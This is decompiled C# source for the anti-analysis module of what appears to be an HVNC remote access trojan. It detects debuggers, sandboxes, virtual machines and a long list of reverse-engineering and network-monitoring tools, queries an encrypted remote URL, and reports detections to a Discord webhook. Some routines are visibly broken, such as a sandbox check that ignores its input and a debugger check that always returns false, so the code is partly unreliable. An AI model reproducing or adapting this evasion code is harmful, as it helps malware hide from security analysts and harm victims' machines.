using System;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;

namespace BirdBrainmofo.HVNC.Helpers
{
	// Token: 0x020000CE RID: 206
	internal sealed class AntiAnalysis
	{
		// Token: 0x0600089C RID: 2204
		[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
		private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

		// Token: 0x0600089D RID: 2205
		[DllImport("kernel32.dll")]
		private static extern IntPtr GetModuleHandle(string lpModuleName);

		// Token: 0x0600089E RID: 2206 RVA: 0x0005D160 File Offset: 0x0005B360
		public static bool Debugger()
		{
			return false;
		}

		// Token: 0x0600089F RID: 2207 RVA: 0x0005D17C File Offset: 0x0005B37C
		public static bool Emulator()
		{
			try
			{
				long ticks = DateTime.Now.Ticks;
				Thread.Sleep(10);
				if (DateTime.Now.Ticks - ticks < 10L)
				{
					return true;
				}
			}
			catch
			{
			}
			return false;
		}

		// Token: 0x060008A0 RID: 2208 RVA: 0x0005D1D8 File Offset: 0x0005B3D8
		public static bool Hosting()
		{
			try
			{
				string text = new WebClient().DownloadString(StringsCrypt.Decrypt(new byte[]
				{
					145, 244, 154, 250, 238, 89, 238, 36, 197, 152,
					49, 235, 197, 102, 94, 163, 45, 250, 10, 108,
					175, 221, 139, 165, 121, 24, 120, 162, 117, 164,
					206, 33, 157, 1, 101, 253, 223, 87, 30, 229,
					249, 102, 235, 195, 201, 170, 140, 162
				}));
				return text.Contains("true");
			}
			catch
			{
			}
			return false;
		}

		// Token: 0x060008A1 RID: 2209 RVA: 0x0005D22C File Offset: 0x0005B42C
		public static bool Processes()
		{
			Process[] processes = Process.GetProcesses();
			string[] selectedProcessList = {
				"dnspy", "Mega Dumper", "Dumper", "PE-bear", "de4dot", "TCPView", "Resource Hacker", "Pestudio", "HxD", "Scylla",
				"de4dot", "PE-bear", "Fakenet-NG", "ProcessExplorer", "SoftICE", "ILSpy", "dump", "proxy", "de4dotmodded", "StringDecryptor",
				"Centos", "SAE", "monitor", "brute", "checker", "zed", "sniffer", "http", "debugger", "james",
				"exeinfope", "codecracker", "x32dbg", "x64dbg", "ollydbg", "ida -", "charles", "dnspy", "simpleassembly", "peek",
				"httpanalyzer", "httpdebug", "fiddler", "wireshark", "dbx", "mdbg", "gdb", "windbg", "dbgclr", "kdb",
				"kgdb", "mdb", "ollydbg", "dumper", "wireshark", "httpdebugger", "http debugger", "fiddler", "decompiler", "unpacker",
				"deobfuscator", "de4dot", "confuser", " /snd", "x64dbg", "x32dbg", "x96dbg", "process hacker", "dotpeek", ".net reflector",
				"ilspy", "file monitoring", "file monitor", "files monitor", "netsharemonitor", "fileactivitywatcher", "fileactivitywatch", "windows explorer tracker", "process monitor", "disk pluse",
				"file activity monitor", "fileactivitymonitor", "file access monitor", "mtail", "snaketail", "tail -n", "httpnetworksniffer", "microsoft message analyzer", "networkmonitor", "network monitor",
				"soap monitor", "internet traffic agent", "socketsniff", "networkminer", "network debugger"
			};
			return processes.Any(process => selectedProcessList.Contains(process.ProcessName.ToLower()));
		}

		// Token: 0x060008A2 RID: 2210 RVA: 0x0005D5B4 File Offset: 0x0005B7B4
		public static bool SandBox()
		{
			string[] array = { "SbieDll", "SxIn", "Sf2", "snxhk", "cmdvrt32" };
			return array.Any(delegate(string dll)
			{
				string text = (-1314171465).ToString();
				string text2 = (-1314176527).ToString();
				return GetModuleHandle(text + text2).ToInt32() != 0;
			});
		}

		// Token: 0x060008A3 RID: 2211 RVA: 0x0005D618 File Offset: 0x0005B818
		public static bool VirtualBox()
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
			{
				try
				{
					using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
					{
						foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
						{
							if ((managementBaseObject["Manufacturer"].ToString().ToLower() == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || managementBaseObject["Manufacturer"].ToString().ToLower().Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
							{
								return true;
							}
						}
					}
				}
				catch
				{
				}
			}
			foreach (ManagementBaseObject managementBaseObject2 in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
			{
				if (managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VMware") && managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VBox"))
				{
					return true;
				}
			}
			return false;
		}

		// Token: 0x060008A4 RID: 2212 RVA: 0x0005D7CC File Offset: 0x0005B9CC
		public static bool Run()
		{
			bool flag;
			if (Config.AntiAnalysis != "1")
			{
				flag = false;
			}
			else
			{
				if (Processes())
				{
					DiscordWebHook.SendReport("Cracking tools detected");
				}
				flag = false;
			}
			return flag;
		}

		// Token: 0x060008A5 RID: 2213 RVA: 0x00006F52 File Offset: 0x00005152
		public AntiAnalysis()
		{
		}

		// Token: 0x020000CF RID: 207
		[CompilerGenerated]
		private sealed class Class5_0
		{
			// Token: 0x060008A6 RID: 2214 RVA: 0x00006F52 File Offset: 0x00005152
			public Class5_0()
			{
			}

			// Token: 0x060008A7 RID: 2215 RVA: 0x0000AB70 File Offset: 0x00008D70
			internal bool Processes_0(Process process)
			{
				return selectedProcessList.Contains(process.ProcessName.ToLower());
			}

			// Token: 0x040006F4 RID: 1780
			public string[] selectedProcessList;
		}

		// Token: 0x020000D0 RID: 208
		[CompilerGenerated]
		[Serializable]
        sealed class cccc
		{
			// Token: 0x060008A8 RID: 2216 RVA: 0x0000AB88 File Offset: 0x00008D88
			// Note: this type is marked as 'beforefieldinit'.
			static cccc()
			{
			}



			// Token: 0x060008AA RID: 2218 RVA: 0x0005D804 File Offset: 0x0005BA04
			internal bool SandBox_60(string dll)
			{
				string text = (-1314171465).ToString();
				string text2 = (-1314176527).ToString();
				return AntiAnalysis.GetModuleHandle(text + text2).ToInt32() != 0;
			}

			// Token: 0x040006F5 RID: 1781
			public static AntiAnalysis.cccc ccc9 = new AntiAnalysis.cccc();

			// Token: 0x040006F6 RID: 1782
			public static Func<string, bool> ccc9__6_0;
		}
	}
}
